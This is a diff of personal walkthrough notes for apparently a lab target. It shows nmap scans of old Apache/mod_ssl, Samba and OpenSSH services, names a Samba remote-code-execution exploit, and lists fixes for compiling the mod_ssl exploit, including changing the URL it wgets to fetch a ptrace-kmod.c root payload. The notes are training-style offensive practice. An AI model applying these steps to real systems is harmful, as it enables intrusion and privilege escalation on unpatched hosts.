@@ -3,7 +3,7 @@
 1. Enumenation
 nmap -p- -sS -A 
 nmap -p- -sV <ip>
-
+#home 192.168.75.129
 22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
 80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
 111/tcp  open  rpcbind     2 (RPC #100000)
@@ -14,9 +14,9 @@ nmap -p- -sV <ip>
 2. Get root 
 2.1. Exploration SMB
 #get smb version
-#search exploit 
-searchexploit samba multiple
+#need to do
 
+#search exploit 
 Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
 
 #run exploit
@@ -25,5 +25,20 @@ Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
 #get apache version
 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
 
+#search exploit
 
+#problem if you compile exploit in 2017
+#http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/
+#and problem mith "SSL2_MT_SERVER_FINISHED"
+#https://www.reddit.com/r/HowToHack/comments/5q2rkp/help_compiling_a_c_exploit/
+1. add in code 
+#include <openssl/rc4.h>
+#include <openssl/md5.h> 
+2. replace where wget
+http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+3. install
+apt-get install libssl1.0-dev
+4. add "const" in code
+const unsigned char *p, *end;
+5. compile code
 
